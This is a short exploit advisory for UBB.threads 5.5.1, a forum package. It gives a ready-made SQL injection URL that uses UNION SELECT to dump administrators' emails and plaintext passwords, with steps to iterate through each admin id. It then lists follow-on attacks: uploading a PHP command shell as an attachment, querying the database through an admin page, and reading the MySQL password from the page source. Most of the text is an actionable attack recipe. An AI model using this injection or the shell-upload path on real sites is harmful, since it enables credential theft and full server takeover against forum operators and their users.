UBB.threads 5.5.1 (message) Remote SQL Injection Vulnerability
==============================================================


Background:
-----------
SQL injection has previously been discovered (http://www.securityfocus.com/bid/14052/)


New Details:
------------
UBBThreads is nice enough to encrypt/mask the regular users' passwords in the database, but stores the admin users' passwords plaintext!


Vulnerable Versions:
--------------------
Tested on version 5.5.1, others may be vulnerable


Admin Login SQL Injection
-------------------------
http://www.website.com/ubbthreads/viewmessage.php?Cat=&message=-99%20UNION%20SELECT%20null,email,password,0,0%20FROM%20admin_users%20WHERE%20id=1/*&status=N&box=received
++  Email is in From: field of forum post
++  Password is text body of post
++  Increment the "id" to obtain each admin's credentials (1, 2, 3, etc.)


Admin login:
------------
http://www.website.com/Admin/login.php
$query = "SELECT * FROM admin_users WHERE email = '$email' AND password = '$password'";


Other Avenues for Attack:
-------------------------
++  Turn on file attachments via /ubbthreads/admin/editconfig.php?Cat= and then upload a php command shell as an attachment to a post  ;) 
++  Query MySQL database via /ubbthreads/admin/dbcommand.php?Cat=
++  Get MySQL username/password (it is plaintext) - view HTML Source of /ubbthreads/admin/editconfig.php?Cat=
